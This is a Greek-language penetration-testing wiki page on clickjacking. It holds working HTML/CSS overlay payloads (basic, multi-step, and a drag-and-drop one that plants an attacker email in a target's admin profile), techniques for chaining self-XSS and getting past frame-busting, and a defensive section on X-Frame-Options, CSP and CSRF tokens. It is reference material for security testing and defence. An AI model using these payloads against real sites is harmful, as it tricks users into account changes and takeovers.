# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Τι είναι το Clickjacking

Σε μια επίθεση clickjacking, ένας **χρήστης** **εξαπατάται** ώστε να **κλικάρει** ένα **στοιχείο** σε μια σελίδα που είτε είναι **αόρατο** είτε μεταμφιεσμένο ως διαφορετικό στοιχείο. Αυτή η χειραγώγηση μπορεί να οδηγήσει σε ανεπιθύμητες συνέπειες για τον χρήστη, όπως το κατέβασμα malware, η ανακατεύθυνση σε κακόβουλες ιστοσελίδες, η παροχή credentials ή ευαίσθητων πληροφοριών, μεταφορές χρημάτων ή η αγορά προϊόντων online.

### Κόλπο προ-συμπλήρωσης φορμών

Μερικές φορές είναι δυνατό να **συμπληρωθεί η τιμή πεδίων μιας φόρμας χρησιμοποιώντας GET παραμέτρους κατά τη φόρτωση μιας σελίδας**. Ένας attacker μπορεί να εκμεταλλευτεί αυτή τη συμπεριφορά για να γεμίσει μια φόρμα με αυθαίρετα δεδομένα και να στείλει το clickjacking payload ώστε ο χρήστης να πατήσει το κουμπί Submit.

### Συμπλήρωση φόρμας με Drag\&Drop

Αν χρειάζεσαι από τον χρήστη να **συμπληρώσει μια φόρμα** αλλά δεν θέλεις να του ζητήσεις άμεσα να γράψει συγκεκριμένες πληροφορίες (όπως το email ή κάποιο συγκεκριμένο password που γνωρίζεις), μπορείς απλώς να του ζητήσεις να **Drag\&Drop** κάτι που θα γράψει τα δεδομένα που ελέγχεις όπως στο [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Πολυβηματικό Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Εάν έχετε εντοπίσει ένα **XSS attack that requires a user to click** σε κάποιο στοιχείο για να **ενεργοποιηθεί** η XSS και η σελίδα είναι **ευάλωτη σε Clickjacking**, μπορείτε να το εκμεταλλευτείτε για να ξεγελάσετε τον χρήστη ώστε να κάνει κλικ στο κουμπί/σύνδεσμο.\
Παράδειγμα:\
Βρήκατε μια **self XSS** σε κάποιες ιδιωτικές πληροφορίες του λογαριασμού (πληροφορίες που **μόνο εσείς μπορείτε να ορίσετε και να διαβάσετε**). Η σελίδα με τη **form** για να θέσετε αυτές τις πληροφορίες είναι **ευάλωτη** σε **Clickjacking** και μπορείτε να **prepopulate** τη **form** με τις GET parameters.\
Ένας επιτιθέμενος θα μπορούσε να ετοιμάσει μια **Clickjacking** επίθεση σε αυτή τη σελίδα **prepopulating** τη **form** με το **XSS payload** και να ξεγελάσει τον **χρήστη** ώστε να **Submit** τη φόρμα. Έτσι, **όταν η form υποβληθεί** και οι τιμές τροποποιηθούν, ο **χρήστης θα εκτελέσει την XSS**.


### DoubleClickjacking

Όπως εξηγείται αρχικά σε αυτό το [post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), αυτή η τεχνική ζητά από το θύμα να κάνει double click σε ένα κουμπί μιας custom σελίδας τοποθετημένης σε συγκεκριμένη θέση, και εκμεταλλεύεται τις χρονικές διαφορές μεταξύ των γεγονότων mousedown και onclick για να φορτώσει την victim page κατά τη διάρκεια του double click, έτσι ώστε το **θύμα στην πραγματικότητα να κάνει κλικ σε ένα νόμιμο κουμπί στη victim page**.

Ένα παράδειγμα φαίνεται σε αυτό το βίντεο: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Ένα code example μπορεί να βρεθεί σε αυτή την [page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Αυτή η τεχνική επιτρέπει να ξεγελάσετε τον χρήστη ώστε να κάνει κλικ σε ένα σημείο στη victim page παρακάμπτοντας κάθε προστασία κατά του clickjacking. Οπότε ο επιτιθέμενος πρέπει να βρει **ευαίσθητες ενέργειες που μπορούν να γίνουν με μόνο 1 κλικ, όπως OAuth prompts για αποδοχή permissions**.

### Browser extensions: DOM-based autofill clickjacking

Εκτός από το iframing victim pages, οι attackers μπορούν να στοχεύσουν UI elements των browser extension που εγχέονται στη σελίδα. Password managers εμφανίζουν autofill dropdowns κοντά σε focused inputs· με το να εστιάσετε ένα attacker-controlled πεδίο και να κρύψετε/αποκρύψετε το extension’s dropdown (opacity/overlay/top-layer tricks), ένα εξαναγκασμένο click χρήστη μπορεί να επιλέξει ένα αποθηκευμένο στοιχείο και να γεμίσει ευαίσθητα δεδομένα σε attacker-controlled inputs. Αυτή η παραλλαγή δεν απαιτεί έκθεση μέσω iframe και λειτουργεί εξ ολοκλήρου μέσω DOM/CSS manipulation.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Σκριπτ που εκτελούνται στο client side μπορούν να κάνουν ενέργειες για να αποτρέψουν το Clickjacking:

- Επαλήθευση ότι το παράθυρο της εφαρμογής είναι το κύριο ή το top window.
- Κάνοντας όλα τα frames ορατά.
- Αποτρέποντας clicks σε αόρατα frames.
- Εντοπισμός και ειδοποίηση των χρηστών για πιθανές προσπάθειες Clickjacking.

Ωστόσο, αυτά τα frame-busting scripts μπορεί να παρακαμφθούν:

- **Browsers' Security Settings:** Ορισμένοι browsers μπορεί να μπλοκάρουν αυτά τα scripts ανάλογα με τις ρυθμίσεις ασφαλείας τους ή την απουσία υποστήριξης JavaScript.
- **HTML5 iframe sandbox Attribute:** Ένας επιτιθέμενος μπορεί να ουδετεροποιήσει frame buster scripts θέτοντας το sandbox attribute με τιμές allow-forms ή allow-scripts χωρίς allow-top-navigation. Αυτό εμποδίζει το iframe από το να επαληθεύσει αν είναι το top window, π.χ.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms and allow-scripts values enable actions within the iframe while disabling top-level navigation. Για να διασφαλιστεί η επιδιωκόμενη λειτουργικότητα του στοχευόμενου site, μπορεί να χρειαστούν επιπλέον δικαιώματα όπως allow-same-origin και allow-modals, ανάλογα με τον τύπο της επίθεσης. Τα μηνύματα στην κονσόλα του browser μπορούν να υποδείξουν ποιες άδειες πρέπει να επιτραπούν.

### Αμυντικές ενέργειες από την πλευρά του server

#### X-Frame-Options

Το **X-Frame-Options HTTP response header** ενημερώνει τους browser σχετικά με τη νομιμότητα του να γίνει render μιας σελίδας σε ένα <frame> ή <iframe>, βοηθώντας στην πρόληψη του Clickjacking:

- X-Frame-Options: deny - Κανένα domain δεν μπορεί να κάνει framing του περιεχομένου.
- X-Frame-Options: sameorigin - Μόνο ο τρέχων ιστότοπος μπορεί να κάνει framing του περιεχομένου.
- X-Frame-Options: allow-from https://trusted.com - Μόνο το καθορισμένο 'uri' μπορεί να κάνει framing της σελίδας.
- Σημειώστε τους περιορισμούς: εάν ο browser δεν υποστηρίζει αυτήν την οδηγία, μπορεί να μην λειτουργήσει. Κάποιοι browsers προτιμούν την CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** είναι η συνιστώμενη μέθοδος για προστασία από Clickjacking:

- frame-ancestors 'none' - Παρόμοιο με X-Frame-Options: deny.
- frame-ancestors 'self' - Παρόμοιο με X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Παρόμοιο με X-Frame-Options: allow-from.

Για παράδειγμα, η ακόλουθη CSP επιτρέπει framing μόνο από το ίδιο domain:

Content-Security-Policy: frame-ancestors 'self';

Περαιτέρω λεπτομέρειες και σύνθετα παραδείγματα μπορούν να βρεθούν στην [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) και στην [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) με child-src και frame-src

**Content Security Policy (CSP)** είναι ένα μέτρο ασφαλείας που βοηθά στην πρόληψη του Clickjacking και άλλων code injection attacks προσδιορίζοντας ποιες πηγές πρέπει να επιτρέπονται από τον browser για τη φόρτωση περιεχομένου.

#### frame-src Directive

- Ορίζει έγκυρες πηγές για frames.
- Πιο συγκεκριμένο από την default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει frames από την ίδια προέλευση (self) και https://trusted-website.com.

#### child-src Οδηγία

- Εισήχθη στο CSP level 2 για να ορίζει έγκυρες πηγές για web workers και frames.
- Λειτουργεί ως fallback για frame-src και worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Αυτή η πολιτική επιτρέπει frames και workers από την ίδια προέλευση (self) και https://trusted-website.com.

**Σημειώσεις Χρήσης:**

- Deprecation: child-src σταδιακά αποσύρεται υπέρ των frame-src και worker-src.
- Fallback Behavior: Αν το frame-src λείπει, το child-src χρησιμοποιείται ως fallback για frames. Αν λείπουν και τα δύο, χρησιμοποιείται το default-src.
- Strict Source Definition: Συμπεριλάβετε μόνο αξιόπιστες πηγές στις οδηγίες για να αποτρέψετε εκμετάλλευση.

#### JavaScript Frame-Breaking Scripts

Παρότι δεν είναι απολύτως εγγυημένα, JavaScript-based frame-busting scripts μπορούν να χρησιμοποιηθούν για να αποτρέψουν μια web page από το να είναι framed. Παράδειγμα:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Χρήση Anti-CSRF Tokens

- **Token Validation:** Χρησιμοποιήστε anti-CSRF tokens σε web εφαρμογές για να διασφαλίσετε ότι τα αιτήματα που αλλάζουν κατάσταση γίνονται σκόπιμα από τον χρήστη και όχι μέσω μιας Clickjacked σελίδας.

## Αναφορές

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
